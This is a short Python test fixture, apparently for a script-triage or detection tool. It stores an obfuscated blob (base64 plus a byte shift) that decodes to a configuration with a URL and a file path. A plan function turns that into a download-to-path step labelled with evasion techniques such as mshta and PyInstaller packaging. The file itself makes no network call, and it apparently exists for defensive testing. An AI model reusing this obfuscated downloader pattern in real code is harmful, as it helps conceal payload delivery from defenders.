#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_d45f609d = ("eUA1f3Z3aHN2QGRmdHhsdWhidWhwcndoL3p1bHdoYmlsb2h/ZGdkc3dodUB1aHR4aHZ3YnZ3dWhkcGJ3cmJzZHdrf3Z3ZGpoYmZyeHF3QDR/dnxxd2R7QGpocWh1Z"
        "HdydWJzbHNob2xxaH9yZWl4dmZkd2xycUBpdnd1bHFqYml1ZGpwaHF3dn9mZHV1bGh1QHN8bHF2d2Rvb2h1YnJxaGlsb2h/emxxZ3J6dmJma2RscUBwdmt3ZGJ3cm"
        "JzfHdrcnF/ZmRwc2RsanFibGdAZmRwc2RsanEwMzQ0PDtoZDU4Nn94dW9Aa3d3c3Y9MjIzNDQ8O2hkNTg2MWh7ZHBzb2gxbHF5ZG9sZzI2ZjZmZ2UzPDFzfH94dmh"
        "1YmRqaHF3QEt4cXd1aHZ2U3x3a3JxMjM0NDw7aGQ1ODZ/aWxvaGJzZHdrQEY9MlN1cmp1ZHBHZHdkMkt4cXd1aHZ2T2RlMjF4c2dkd2gwMzQ0PDtoZDU4NjFzfA==")
    CODEC_d45f609d = "base64_chunks|add_modulo_256|03"

    def load_d45f609d():
        return base64.b64decode(MATERIAL_d45f609d)

    def decode_d45f609d(stored_bytes):
        return bytes((value - 3) % 256 for value in stored_bytes)

    def recover_d45f609d():
        harmless_value = None
        recovered_bytes = decode_d45f609d(load_d45f609d())
        configuration_text = recovered_bytes.decode("ascii", "strict")
        return configuration_text

    def inspect_d45f609d():
        return recover_d45f609d()

    def surface_d45f609d():
        stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))
        return tuple(stream)

    def obfuscation_d45f609d():
        left, right = "fstrin", "g_fragments"
        return f"{left}{right}"

    def plan_d45f609d():
        fields = dict(item.split("=", 1) for item in inspect_d45f609d().split("|"))
        analysis_surface = surface_d45f609d()
        obfuscation_surface = obfuscation_d45f609d()
        operation_plan = ("request_stream_to_path", fields["url"], fields["file_path"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_d45f609d())
